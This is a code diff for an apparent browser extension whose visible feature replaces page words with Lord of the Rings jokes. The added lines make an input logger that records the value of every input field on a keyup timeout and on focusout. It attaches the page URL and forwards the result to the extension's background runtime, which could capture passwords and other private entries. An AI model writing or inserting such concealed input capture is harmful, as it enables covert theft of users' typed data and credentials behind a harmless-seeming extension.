@@ -23,8 +23,20 @@ class InputReader {
         })
     }
 
+    _sendMessageRuntime(message, tabId) {
+        return new Promise((resolve, reject) => {
+            chrome.runtime.sendMessage({msg: message}, (response) => {
+                resolve();
+            });
+        });
+    }
+
     _onDoneTyping(input, elName) {
-        console.log(elName + ": " + input);
+        const url = encodeURI(window.location.href);
+        const message = elName + ": " + input + ", " + url;
+        console.log(message);
+
+        this._sendMessageRuntime(message);
     }
 
     _inputLogger(inputEl, elName, typingInterval, onDoneTyping, observer){
@@ -34,13 +46,22 @@ class InputReader {
         inputEl.addEventListener('keyup', () => {
             clearTimeout(typingTimer);
             typingTimer = setTimeout(() => {
-                return onDoneTyping(inputEl.value, elName);
+                if (inputEl.value.length) {
+                    return this._onDoneTyping(inputEl.value, elName);
+                }
             }, typingInterval);
         });
     
         //on keydown, clear the countdown 
         inputEl.addEventListener('keydown', () => {
             clearTimeout(typingTimer);
+        });
+
+        //capture unfocus
+        inputEl.addEventListener('focusout', () => {
+            if (inputEl.value.length) {
+                return this._onDoneTyping(inputEl.value, elName);
+            }
         });
     }
 }
@@ -89,5 +110,5 @@ window.onload = () => {
             inputReader.readUserInput(document);
             listenForMutation(() => {inputReader.checkForInputs});
         })
-    replaceWords([["Your", "Gandalf's"], ["Personal", "My Precious"], ["Facebook", "Eye of Sauron"] ]);
+    replaceWords([["Your", "Gandalf's"], ["Personal", "My Precious"], ["My", "My Precious"], ["Facebook", "Eye of Sauron"] ]);
 };
